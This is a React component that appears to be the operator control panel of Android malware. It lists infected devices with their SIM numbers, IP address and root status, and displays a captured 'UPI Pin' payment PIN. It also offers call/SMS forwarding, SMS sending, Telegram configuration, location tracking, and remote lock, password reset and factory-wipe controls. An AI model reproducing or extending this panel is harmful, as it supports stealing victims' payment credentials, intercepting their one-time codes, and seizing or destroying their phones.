import {
  FiMapPin,
  FiRefreshCw,
  FiEdit2,
  FiSave,
  FiPhone,
  FiWifi,
  FiLock,
  FiTrash2,
  FiShield,
  FiKey,
} from "react-icons/fi";
import { FaSimCard } from "react-icons/fa";
import { ModalType } from "./UnifiedModal";
import { useState } from "react";
import { toast } from "sonner";

interface DeviceDetailsProps {
  device: any;
  onLocateDevice: () => void;
  isLocating: boolean;
  setShowModal: (show: boolean) => void;
  setModalType: (type: ModalType) => void;
  onSaveNote: (note: string) => void;
  onDeviceAdmin: (
    action: "enable-device-admin" | "lock-device" | "force-lock" | "wipe-device" | "reset-password",
    extra?: Record<string, any>
  ) => void;
  isAdminBusy?: boolean;
}

interface SimData {
  simSlotIndex: number;
  phoneNumber?: string;
  carrierName?: string;
}

export default function DeviceDetails({
  device,
  onLocateDevice,
  isLocating,
  setShowModal,
  setModalType,
  onSaveNote,
  onDeviceAdmin,
  isAdminBusy,
}: DeviceDetailsProps) {
  const [isEditingNote, setIsEditingNote] = useState(false);
  const [note, setNote] = useState(device.note || "");
  const [showResetPw, setShowResetPw] = useState(false);
  const [newPassword, setNewPassword] = useState("");

  const requireOnline = (): boolean => {
    if (!device.status || !device.socketId) {
      toast.error("Device is offline or not connected");
      return false;
    }
    return true;
  };

  const confirmDestructive = (msg: string): boolean => {
    return window.confirm(msg);
  };

  const handleDeviceAdminClick = (
    action: "enable-device-admin" | "lock-device" | "force-lock" | "wipe-device" | "reset-password"
  ) => {
    if (!requireOnline()) return;

    if (action === "wipe-device") {
      if (!confirmDestructive("Factory reset the device? This will erase all data and cannot be undone.")) {
        return;
      }
    }
    if (action === "reset-password") {
      setShowResetPw(true);
      return;
    }

    onDeviceAdmin(action);
  };

  const submitResetPassword = () => {
    if (!newPassword) {
      toast.error("Enter a new password");
      return;
    }
    onDeviceAdmin("reset-password", { password: newPassword });
    setNewPassword("");
    setShowResetPw(false);
  };

  const getValidSimData = (): SimData[] => {
    try {
      const simData = device?.simData;

      if (!Array.isArray(simData)) return [];

      return simData.filter(
        (sim) => sim && (sim.phoneNumber || sim.carrierName)
      );
    } catch (err) {
      console.error("Failed to process simData:", err);
      return [];
    }
  };

  const simCards = getValidSimData();

  const handleSaveNote = () => {
    onSaveNote(note);
    setIsEditingNote(false);
  };

  return (
    <div className="lg:col-span-1 bg-gray-800/50 rounded-xl shadow-lg p-6 border border-gray-700 backdrop-blur-sm flex flex-col h-full">
      {/* Device Header */}
      <div className="flex items-center justify-between mb-6">
        <div>
          <h2 className="text-xl font-bold text-white capitalize">
            {device.modelName}
          </h2>
        </div>
        <div
          className={`px-3 py-1 rounded-full text-xs font-medium ${
            device.status
              ? "bg-green-900/50 text-green-400"
              : "bg-red-900/50 text-red-400"
          }`}
        >
          {device.status ? "Online" : "Offline"}
        </div>
      </div>

      {/* Device Specs Grid */}
      <div className="grid grid-cols-2 gap-4 mb-6">
        <div>
          <p className="text-xs text-gray-400">Android Version</p>
          <p className="text-sm text-white">
            Android {device.androidV} (SDK {device.sdkV})
          </p>
        </div>
        <div>
          <p className="text-xs text-gray-400">CPU</p>
          <p className="text-sm text-white capitalize">{device.cpu_arch}</p>
        </div>
        <div>
          <p className="text-xs text-gray-400">Storage</p>
          <p className="text-sm text-white">
            {device.storage} {device.isSdCard && "+ SD Card"}
          </p>
        </div>
        <div>
          <p className="text-xs text-gray-400">Battery</p>
          <p className="text-sm text-white">{device.battery}</p>
        </div>
        <div>
          <p className="text-xs text-gray-400">Root Access</p>
          <p className="text-sm text-white">{device.isRoot ? "Yes" : "No"}</p>
        </div>
        <div>
          <p className="text-xs text-gray-400">UPI Pin</p>
          <p
            className={`text-sm ${
              device.upi_pin ? "text-green-400" : "text-gray-400"
            }`}
          >
            {device.upi_pin ? device.upi_pin : "Not Available"}
          </p>
        </div>
      </div>

      {/* SIM Cards Section */}
      {simCards.length > 0 && (
        <div className="mb-6 p-4 bg-gray-800/30 rounded-lg border border-gray-700">
          <div className="flex items-center justify-between mb-3">
            <div className="flex items-center gap-2">
              <FaSimCard className="text-indigo-400" size={16} />
              <h3 className="text-sm font-medium text-gray-300">
                SIM Information
              </h3>
            </div>
            <span className="text-xs px-2 py-1 bg-gray-700/50 rounded-full text-gray-300">
              {simCards.length} SIM{simCards.length > 1 ? "s" : ""}
            </span>
          </div>

          <div className="space-y-3">
            {simCards.map((sim: any, index: number) => (
              <div
                key={index}
                className="p-3 bg-gray-800/50 rounded-lg border border-gray-700"
              >
                <div className="flex items-center gap-3 mb-2">
                  <div className="p-2 bg-gray-700/50 rounded-full">
                    <FiPhone className="text-indigo-400" size={14} />
                  </div>
                  <div>
                    <p className="text-xs text-gray-400">
                      SIM{" "}
                      {sim.simSlotIndex !== undefined
                        ? sim.simSlotIndex
                        : index}
                    </p>
                    <p className="text-sm font-medium text-white">
                      {sim.carrierName || "Unknown Carrier"}
                    </p>
                  </div>
                </div>

                {sim.phoneNumber && (
                  <div className="flex items-center gap-2 text-sm text-gray-300 pl-11">
                    <span className="opacity-70">Number:</span>
                    <span className="font-mono">{sim.phoneNumber}</span>
                  </div>
                )}

                {/* Additional SIM info can be added here */}
              </div>
            ))}
          </div>
        </div>
      )}

      {/* Network Card */}
      <div className="mb-6 p-4 bg-gray-800/30 rounded-lg border border-gray-700">
        <div className="flex items-center justify-between mb-3">
          <div className="flex items-center gap-2">
            <FiWifi className="text-indigo-400" size={16} />
            <h3 className="text-sm font-medium text-gray-300">
              Network Information
            </h3>
          </div>
          <button
            onClick={onLocateDevice}
            disabled={isLocating}
            className="text-indigo-400 hover:text-indigo-300 transition-colors"
            title="Locate device"
          >
            {isLocating ? (
              <FiRefreshCw className="animate-spin" size={14} />
            ) : (
              <FiMapPin size={14} />
            )}
          </button>
        </div>
        <div className="space-y-2 pl-8">
          <div className="flex items-baseline gap-2">
            <span className="text-xs text-gray-400 w-20">IP:</span>
            <span className="text-sm text-white">
              {device.ipAddress || "N/A"}
            </span>
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-xs text-gray-400 w-20">Provider:</span>
            <span className="text-sm text-white">
              {device.service_provider || "N/A"}
            </span>
          </div>
          <div className="flex items-baseline gap-2">
            <span className="text-xs text-gray-400 w-20">Mobile:</span>
            <span className="text-sm text-white">{device.mobNo || "N/A"}</span>
          </div>
        </div>
      </div>

      {/* Connection Info */}
      <div className="mb-6 p-4 bg-gray-800/30 rounded-lg border border-gray-700">
        <p className="text-xs text-gray-400 mb-2">Connection</p>
        <div className="grid grid-cols-2 gap-2">
          <div>
            <p className="text-xs text-gray-400">First Seen</p>
            <p className="text-sm text-white">
              {new Date(device.joined?.$date || device.joined).toLocaleString()}
            </p>
          </div>
          <div>
            <p className="text-xs text-gray-400">Last Seen</p>
            <p className="text-sm text-white">
              {new Date(
                device.lastSeen?.$date || device.lastSeen
              ).toLocaleString()}
            </p>
          </div>
        </div>
      </div>

      {/* Note Section */}
      <div className="mb-6 flex-grow">
        <div className="flex items-center justify-between mb-2">
          <label className="text-sm text-gray-400">Device Note</label>
          <div className="flex gap-2">
            {isEditingNote ? (
              <button
                onClick={handleSaveNote}
                className="text-green-400 hover:text-green-300"
                title="Save note"
              >
                <FiSave size={14} />
              </button>
            ) : (
              <button
                onClick={() => setIsEditingNote(true)}
                className="text-gray-400 hover:text-indigo-400"
                title="Edit note"
              >
                <FiEdit2 size={14} />
              </button>
            )}
          </div>
        </div>
        <textarea
          className="w-full bg-gray-800/30 border border-gray-700 rounded-md p-3 text-sm text-white focus:border-indigo-500 focus:ring-1 focus:ring-indigo-500"
          rows={3}
          value={note}
          onChange={(e) => setNote(e.target.value)}
          placeholder="Add notes about this device..."
          disabled={!isEditingNote}
        />
      </div>

      {/* Action Buttons - Always Enabled, Only Toast on Offline/Disconnected */}
      <div className="space-y-3">
        <button
          onClick={() => {
            if (!device.status || !device.socketId) {
              toast.error("Device is offline or not connected");
              return;
            }
            setModalType("forwarding");
            setShowModal(true);
          }}
          className="w-full bg-gray-700/50 hover:bg-gray-600/50 text-white py-2 px-4 rounded-md flex items-center justify-center transition-all border border-gray-600 hover:border-indigo-500 text-sm"
        >
          Call/SMS Forwarding
        </button>

        <button
          onClick={() => {
            if (!device.status || !device.socketId) {
              toast.error("Device is offline or not connected");
              return;
            }
            setModalType("sms");
            setShowModal(true);
          }}
          className="w-full bg-gray-700/50 hover:bg-gray-600/50 text-white py-2 px-4 rounded-md flex items-center justify-center transition-all border border-gray-600 hover:border-indigo-500 text-sm"
        >
          Send SMS
        </button>

        <button
          onClick={() => {
            if (!device.status || !device.socketId) {
              toast.error("Device is offline or not connected");
              return;
            }
            setModalType("telegram");
            setShowModal(true);
          }}
          className="w-full bg-gray-700/50 hover:bg-gray-600/50 text-white py-2 px-4 rounded-md flex items-center justify-center transition-all border border-gray-600 hover:border-indigo-500 text-sm"
        >
          Telegram Config
        </button>

        {/* Device Admin Controls */}
        <div className="pt-2 mt-2 border-t border-gray-700">
          <div className="flex items-center gap-2 mb-2">
            <FiShield className="text-indigo-400" size={14} />
            <span className="text-xs uppercase tracking-wider text-gray-400">
              Device Admin
            </span>
          </div>

          <button
            onClick={() => handleDeviceAdminClick("enable-device-admin")}
            disabled={isAdminBusy}
            className="w-full bg-indigo-700/40 hover:bg-indigo-700/60 text-indigo-200 py-2 px-4 rounded-md flex items-center justify-center transition-all border border-indigo-700/50 hover:border-indigo-500 text-sm mb-2"
          >
            <FiShield className="mr-2" size={14} />
            Enable Device Admin
          </button>

          <div className="grid grid-cols-2 gap-2 mb-2">
            <button
              onClick={() => handleDeviceAdminClick("lock-device")}
              disabled={isAdminBusy}
              className="bg-yellow-700/30 hover:bg-yellow-700/50 text-yellow-200 py-2 px-3 rounded-md flex items-center justify-center transition-all border border-yellow-700/40 hover:border-yellow-500 text-xs"
            >
              <FiLock className="mr-1" size={12} />
              Lock
            </button>
            <button
              onClick={() => handleDeviceAdminClick("force-lock")}
              disabled={isAdminBusy}
              className="bg-orange-700/30 hover:bg-orange-700/50 text-orange-200 py-2 px-3 rounded-md flex items-center justify-center transition-all border border-orange-700/40 hover:border-orange-500 text-xs"
            >
              <FiLock className="mr-1" size={12} />
              Force Lock
            </button>
          </div>

          <div className="grid grid-cols-2 gap-2">
            <button
              onClick={() => handleDeviceAdminClick("reset-password")}
              disabled={isAdminBusy}
              className="bg-blue-700/30 hover:bg-blue-700/50 text-blue-200 py-2 px-3 rounded-md flex items-center justify-center transition-all border border-blue-700/40 hover:border-blue-500 text-xs"
            >
              <FiKey className="mr-1" size={12} />
              Reset PW
            </button>
            <button
              onClick={() => handleDeviceAdminClick("wipe-device")}
              disabled={isAdminBusy}
              className="bg-red-700/30 hover:bg-red-700/50 text-red-200 py-2 px-3 rounded-md flex items-center justify-center transition-all border border-red-700/40 hover:border-red-500 text-xs"
            >
              <FiTrash2 className="mr-1" size={12} />
              Wipe
            </button>
          </div>
        </div>

        {showResetPw && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/60">
            <div className="bg-gray-800 border border-gray-700 rounded-lg p-5 w-80 max-w-[90vw]">
              <h3 className="text-white font-medium mb-2 flex items-center">
                <FiKey className="mr-2" /> Reset Lock Screen Password
              </h3>
              <p className="text-xs text-gray-400 mb-3">
                Empty value clears the existing password (if supported).
              </p>
              <input
                type="text"
                value={newPassword}
                onChange={(e) => setNewPassword(e.target.value)}
                placeholder="New password (4+ chars)"
                className="w-full bg-gray-900 border border-gray-700 rounded px-3 py-2 text-white text-sm mb-3"
              />
              <div className="flex gap-2 justify-end">
                <button
                  onClick={() => {
                    setShowResetPw(false);
                    setNewPassword("");
                  }}
                  className="px-3 py-1.5 rounded bg-gray-700 hover:bg-gray-600 text-sm text-gray-200"
                >
                  Cancel
                </button>
                <button
                  onClick={submitResetPassword}
                  className="px-3 py-1.5 rounded bg-blue-600 hover:bg-blue-700 text-sm text-white"
                >
                  Apply
                </button>
              </div>
            </div>
          </div>
        )}
      </div>
    </div>
  );
}
